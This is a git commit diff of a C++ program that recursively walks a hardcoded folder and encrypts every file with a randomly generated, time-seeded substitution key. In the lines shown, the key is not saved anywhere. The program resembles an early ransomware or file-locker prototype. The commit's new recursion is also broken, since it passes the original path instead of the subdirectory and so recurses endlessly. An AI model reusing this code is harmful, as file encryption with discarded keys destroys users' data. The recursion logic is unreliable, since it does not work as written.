2e11e9abe3b122695964f95a4fa74f32e761b1ab
Ace-Krypton <ramizna@code.edu.az>
2022-10-08 19:37:52 +0200

    .

--- main.cpp
+++ main.cpp
@@ -5,24 +5,12 @@
 #include <random>
 #include <map>
 
-int main() {
-    auto path = std::string("/home/draco/TobeEncrypted");
-    char byte = 0;
-
-    std::string combinations = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_+=[]{};:'\",./?,<~>`|\\1234567890";
-    unsigned seed = std::chrono::steady_clock::now().time_since_epoch().count();
-    std::default_random_engine engine(seed);
-    int key;
-
-    std::map<char, int> encryption;
-
-    for (auto &combination : combinations) {
-        std::uniform_int_distribution<int> keys(100000, 999999);
-        key = keys(engine);
-        encryption[combination] = key;
-    }
-
+auto encryptor(std::string &path, std::map<char, int> &encryption, char &byte) -> void {
     for (const auto &entry : std::filesystem::directory_iterator(path)) {
+        if (entry.is_directory()) {
+            encryptor(path, encryption, byte);
+        }
+
         std::ifstream read(entry.path());
 
         if (!read.is_open()) std::cerr << "[-] Could not open the file - '" << path << "'" << std::endl;
@@ -44,4 +32,24 @@ int main() {
         }
         std::cout << "[*] File encrypted successfully\n" << std::endl;
     }
+}
+
+auto main() -> int {
+    auto path = std::string("/home/draco/TobeEncrypted");
+    char byte = 0;
+
+    std::string combinations = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_+=[]{};:'\",./?,<~>`|\\1234567890";
+    unsigned seed = std::chrono::steady_clock::now().time_since_epoch().count();
+    std::default_random_engine engine(seed);
+    int key;
+
+    std::map<char, int> encryption;
+
+    for (auto &combination : combinations) {
+        std::uniform_int_distribution<int> keys(100000, 999999);
+        key = keys(engine);
+        encryption[combination] = key;
+    }
+
+    encryptor(path, encryption, byte);
 }
